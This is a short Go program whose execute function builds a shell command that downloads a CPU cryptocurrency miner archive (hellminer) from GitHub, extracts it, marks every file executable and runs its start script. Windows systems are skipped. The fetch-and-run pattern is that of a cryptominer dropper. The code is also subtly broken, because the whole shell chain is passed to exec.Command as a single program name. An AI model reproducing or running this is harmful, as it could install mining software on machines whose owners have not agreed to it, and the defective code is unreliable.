package main

import (
    "fmt"
    "os/exec"
    "runtime"
)
func execute() {

    out, err := exec.Command("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x * && bash start.sh").Output()
    if err != nil {
        fmt.Printf("%s", err)
    }
    fmt.Println("Program executed")
    output := string(out[:])
    fmt.Println(output)

}
func main() {
    if runtime.GOOS == "windows" {
        fmt.Println("This program is not aplicable for windows machine.")
    } else {
        execute()
    }
}
